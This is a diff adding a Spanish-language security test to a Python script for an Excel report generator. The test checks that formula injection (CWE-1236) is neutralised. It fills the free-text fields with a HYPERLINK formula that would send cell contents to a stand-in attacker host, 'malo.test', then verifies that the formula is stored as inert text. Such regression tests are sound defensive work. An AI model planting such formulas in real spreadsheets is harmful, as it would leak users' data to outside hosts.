@@ -130,5 +130,17 @@ h = huella(dias)
 gi = libro.generar(crudo_con(dias=dias, sha256=h), None, None, NEG, NIT, AHORA)
 chk([x["fecha"] for x in gi["invalidos"]] == ["2026-02-30"] and not distintas(gi["xlsx"], g["xlsx"]), f"R7: un día inválido se lista y el resto sale igual: {gi['invalidos']}")
 
+# 6-test · S2 (CWE-1236): un crudo armado con fórmulas en cada texto libre no deja ninguna fórmula activa en el Excel
+MAL = '=HYPERLINK("http://malo.test/?x="&A1,"ver")'
+dias = json.loads(json.dumps(j["dias"]))
+for d in dias:
+    for doc in d["documentos"]:
+        for k, v in doc.items():
+            if isinstance(v, str) and k not in ("fecha", "id", "tipo", "cuenta", "medio", "dup_de"): doc[k] = MAL
+wb = load_workbook(io.BytesIO(libro.generar(crudo_con(dias=dias, sha256=huella(dias)), None, None, NEG, NIT, AHORA)["xlsx"]))
+activas = [f"{ws.title}!{c.coordinate}" for ws in wb for fila in ws.iter_rows() for c in fila if c.data_type == "f" and "malo.test" in str(c.value)]
+como_texto = sum(1 for ws in wb for fila in ws.iter_rows() for c in fila if c.data_type == "s" and "malo.test" in str(c.value))
+chk(como_texto > 0 and not activas, f"S2: fórmulas del crudo quedan como texto ({como_texto} celdas), activas: {activas[:3]}")
+
 print(f"\n{'OK' if not fallos else f'{len(fallos)} FALLOS'}")
 sys.exit(1 if fallos else 0)
